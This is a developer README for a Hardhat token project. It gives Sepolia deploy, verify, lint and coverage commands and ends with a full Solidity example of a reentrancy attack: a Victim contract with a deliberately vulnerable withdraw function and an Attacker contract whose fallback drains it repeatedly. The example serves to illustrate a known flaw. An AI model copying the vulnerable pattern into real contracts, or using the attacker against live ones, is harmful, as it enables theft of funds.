# secret-token

Deploy:
npx hardhat run /Users/antonpolenyaka/Documents/GitHub/secret-token/scripts/deploy.ts --network sepolia

SecretToken deployed to 0x841c4091C27D1Af754a4DA9Fbb0B0941Bce7E19d

npx hardhat --network sepolia verify --constructor-args ./scripts/arguments.ts 0x841c4091C27D1Af754a4DA9Fbb0B0941Bce7E19d

https://sepolia.etherscan.io/address/0x841c4091C27D1Af754a4DA9Fbb0B0941Bce7E19d#code

solhint contracts/ExampleContract.sol

solhint init-config 
solium --init 

coverage:
.../secret-token/coverage/index.html

SecretToken deployed to 0xa0Fc09E2Cbf0Da363039dB99894E7a3E5b5A9B48

Example Reentrancy:

pragma solidity 0.4.26;

contract Victim {

    uint public owedToAttacker;

    function Victim() payable {
        owedToAttacker =11;
    }

    function withdraw() payable {
        if (!msg.sender.call.value(owedToAttacker)()) revert(); 
        owedToAttacker = 0;
    }

    // deposit some funds for testing
    function deposit() payable {}

    function getBalance() public constant returns(uint) { return this.balance; }   

    function () payable {} 
}

contract Attacker {

    Victim v;
    uint public count;

    event LogFallback(uint count, uint balance);

    function Attacker(address victim) payable {
        v = Victim(victim);
    }

    function attack() payable {
        v.withdraw();
    }

    function () payable {
        count++;
        LogFallback(count, this.balance);
        // crude stop before we run out of gas
        if(count < 5) v.withdraw();
    }

    function getBalance() public constant returns(uint) { return this.balance; }    

}